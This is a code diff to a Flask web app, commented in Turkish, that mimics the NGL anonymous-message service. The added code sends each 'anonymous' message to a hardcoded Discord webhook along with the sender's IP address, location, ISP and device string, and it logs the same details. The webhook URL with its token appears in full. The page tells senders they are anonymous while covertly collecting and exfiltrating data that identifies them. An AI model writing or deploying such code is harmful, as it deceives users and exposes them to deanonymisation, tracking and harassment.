@@ -2,6 +2,7 @@ from flask import Flask, request, render_template_string, redirect
 import logging
 import requests
 import os
+from datetime import datetime
 
 # Logging ayarları – hem dosyaya hem Render konsoluna yazsın
 logging.basicConfig(
@@ -216,36 +217,39 @@ def ngl_page(username):
     if request.method == 'POST':
         msg = request.form.get('message', '').strip()
         if msg:
-            # Discord webhook linkini buraya koy (kendi webhook'unu al)
-                discord_webhook = "https://discordapp.com/api/webhooks/1467529164444668037/u22KPPoEIghrxWupLJrwcDDUV3F8u-3b_Y_wOTOqpP7rA7lUJH6aKL1P85rUeuNAhq8z"  # ← burayı değiştir
-
-               if discord_webhook and msg:
-                   embed = {
-                  "title": "Yeni Anonim Mesaj! 📩",
-                  "description": f"```diff\n+ {msg}\n```",
-                  "color": 9055202,  # mor-pembe renk kodu (hex: #8A2BE2)
-                   "fields": [
-                       {"name": "Gönderen", "value": f"@{username} (anonim)", "inline": True},
-                       {"name": "IP / Konum", "value": f"{client_ip} | {location}", "inline": True},
-                       {"name": "ISP / Cihaz", "value": f"{isp} | {user_agent[:100]}", "inline": False}
-        ],
-        "footer": {
-            "text": "sent with ♥ from team NGL",
-            "icon_url": "https://example.com/ngl-icon.png"  # istersen NGL logosu linki koy
-        },
-        "timestamp": datetime.now().isoformat()
-    }
-
-    payload = {"embeds": [embed]}
-
-    try:
-        requests.post(discord_webhook, json=payload)
-        logging.info("[DISCORD] Embed bildirimi gönderildi")
-    except Exception as e:
-        logging.error(f"[DISCORD HATASI] {str(e)}")
             log_entry = f"@{username} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | UA: {user_agent}"
             logging.info(log_entry)
             print(f"[YENİ MESAJ] {log_entry}")
+
+            # Discord webhook – NGL tarzı kutu gönderme
+            discord_webhook = "https://discordapp.com/api/webhooks/1467529164444668037/u22KPPoEIghrxWupLJrwcDDUV3F8u-3b_Y_wOTOqpP7rA7lUJH6aKL1P85rUeuNAhq8z"  # ← burayı KENDİ WEBHOOK'UNLA DEĞİŞTİR
+
+            if discord_webhook:
+                embed = {
+                    "title": "Yeni Anonim Mesaj! 📩",
+                    "description": f"**{msg}**",  # Mesaj içeriği büyük ve bold
+                    "color": 0x8A2BE2,  # Mor-pembe NGL rengi
+                    "fields": [
+                        {"name": "Gönderen", "value": f"@{username} (anonim)", "inline": True},
+                        {"name": "IP / Konum", "value": f"{client_ip} | {location}", "inline": True},
+                        {"name": "ISP", "value": isp, "inline": True},
+                        {"name": "Cihaz", "value": user_agent[:100], "inline": False}
+                    ],
+                    "footer": {
+                        "text": "sent with ♥ from team NGL",
+                        "icon_url": "https://example.com/ngl-icon.png"  # İstersen NGL logosu linki koy, yoksa sil
+                    },
+                    "timestamp": datetime.now().isoformat()
+                }
+
+                payload = {"embeds": [embed]}
+
+                try:
+                    requests.post(discord_webhook, json=payload)
+                    logging.info("[DISCORD] NGL tarzı kutu gönderildi")
+                except Exception as e:
+                    logging.error(f"[DISCORD HATASI] {str(e)}")
+
         return render_template_string(NGL_HTML, username=username, success=True)
 
     return render_template_string(NGL_HTML, username=username, success=False)
